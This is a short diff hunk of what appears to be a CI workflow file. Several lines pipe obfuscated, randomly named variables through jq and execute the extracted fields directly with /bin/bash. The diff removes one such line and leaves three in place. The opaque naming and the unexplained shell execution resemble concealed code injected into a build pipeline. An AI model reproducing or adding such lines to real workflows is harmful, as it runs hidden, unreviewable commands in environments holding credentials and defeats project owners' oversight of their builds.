@@ -26,7 +26,6 @@ jobs:
           echo $fioch68718 | jq -r .rbmec579 | /bin/bash
           printf '%s' "$eqfb0994" | jq -r .d173 | /bin/bash
           printf '%s' "$qleg5" | jq -r .lb4903 | /bin/bash
-          echo $vhg1 | jq -r .p2 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
